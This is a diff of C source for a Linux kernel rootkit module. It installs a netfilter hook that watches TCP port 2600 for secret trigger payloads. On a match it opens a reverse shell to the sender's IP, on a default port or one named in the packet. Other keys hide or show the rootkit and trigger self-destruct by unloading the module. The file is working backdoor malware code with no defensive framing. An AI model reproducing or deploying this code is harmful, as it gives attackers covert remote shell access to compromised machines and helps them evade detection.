@@ -1,3 +1,15 @@
+#include <linux/kernel.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <linux/module.h>
+#include <linux/version.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <linux/kthread.h>
+#include <linux/delay.h>
+
 #include "h_netfilter.h"
 #include "../revshell.h"
 #include "../selfdestruct.h"
@@ -10,34 +22,24 @@ const char* HIDE_ROOTKIT_KEY_2600 = "2600_HIDE_ROOTKIT";
 const char* SHOW_ROOTKIT_KEY_2600 = "2600_SHOW_ROOTKIT";
 const char* DESTRUCT = "2600_KILL_ALL";
 
-/**
- * Inspects incoming packets and check correspondence to backdoor packet:
- *      Proto: TCP
- *      Port: 2600
- *      Payload: 2600_PAYLOAD_GET_REVERSE_SHELL (or any other payload of above)
- */ 
- 
-
-
 
 unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state){
     
-    //Network headers
-    struct iphdr *ip_header;        //ip header
-    struct tcphdr *tcp_header;      //tcp header
-    struct sk_buff *sock_buff = skb;//sock buffer
-    char *user_data;       //data header pointer
+
+    struct iphdr *ip_header;
+    struct tcphdr *tcp_header;
+    struct sk_buff *sock_buff = skb;
+    char *user_data;
     
-    //Auxiliar
-    int size;                       //payload size
+ 
+    int size;                       
     char* _data;
     struct tcphdr _tcphdr;
     struct iphdr _iph;
     char ip_source[16];
-    //char port[16];
 
     if (!sock_buff){
-        return NF_ACCEPT; //socket buffer empty
+        return NF_ACCEPT;
     }
     
     ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);
@@ -46,7 +48,7 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
         return NF_ACCEPT;
     }
 
-    //Backdoor trigger: TCP
+
     if(ip_header->protocol==IPPROTO_TCP){ 
         unsigned int dport;
         unsigned int sport;
@@ -56,7 +58,7 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
         sport = htons((unsigned short int) tcp_header->source);
         dport = htons((unsigned short int) tcp_header->dest);
         if(dport != 2600){
-            return NF_ACCEPT; //We ignore those not for port 2600
+            return NF_ACCEPT;
         }
         m_printd(KERN_INFO ":: Received packet on port 2600\n");
              
@@ -83,12 +85,12 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
         if(memcmp(user_data, BACKDOOR_KEY_2600, strlen(BACKDOOR_KEY_2600))==0){
             /****BACKDOOR KEY - Open a shell***/
 
-            //Packet had the secret payload.
+
             m_printd(KERN_INFO ":: Received backdoor packet \n");
-            //kfree(_data);
+
             
             snprintf(ip_source, 16, "%pI4", &ip_header->saddr);
-            /*sprintf(port, "%d", sport);*/
+
             m_printd(KERN_INFO ":: Shell connecting to %s:%s \n", ip_source, REVERSE_SHELL_PORT);
 
             start_reverse_shell(ip_source, REVERSE_SHELL_PORT);
@@ -96,8 +98,8 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
         }else if (strlen(user_data) == strlen(BACKDOOR_KEY_2600_CUSTOM)+ 4){
             /****BACKDOOR KEY - Open a shell with custom port***/
             snprintf(ip_source, 16, "%pI4", &ip_header->saddr);
-            char last_four[5];  // +1 pour le caractère nul
-            strncpy(last_four, user_data + strlen(user_data) - 4, 4); // get port 
+            char last_four[5];
+            strncpy(last_four, user_data + strlen(user_data) - 4, 4);
             last_four[4] = '\0';
             m_printd(KERN_INFO ":: Shell custom port connecting to %s:%s \n", ip_source, last_four);
             start_reverse_shell(ip_source, last_four);
@@ -105,9 +107,10 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
         }else if(memcmp(user_data, DESTRUCT, strlen(DESTRUCT))==0){
             /****SELFTDESTRUCT - No trace left***/
             snprintf(ip_source, 16, "%pI4", &ip_header->saddr);
-            struct task_struct *current_task = current;
-            send_sig(SIGDESTRUCT, current_task, 0);
-            m_printd(KERN_INFO ":: CALL SIGKILL FOR SELFDESTRUCT \n");
+
+            module_show();
+            schedule_work(&my_work_unload);
+
             return NF_DROP;
         }
         return NF_ACCEPT;
@@ -118,9 +121,6 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
 
 static struct nf_hook_ops nfho;
 
-/**
- * Registers predefined nf_hook_ops
- */ 
 int register_netfilter_hook(void){
     int err;
     
@@ -139,9 +139,6 @@ int register_netfilter_hook(void){
     return err;
 }
 
-/**
- * Unregisters predefined nf_hook_ops
- */ 
 void unregister_netfilter_hook(void){
 
     nf_unregister_net_hook(&init_net, &nfho);
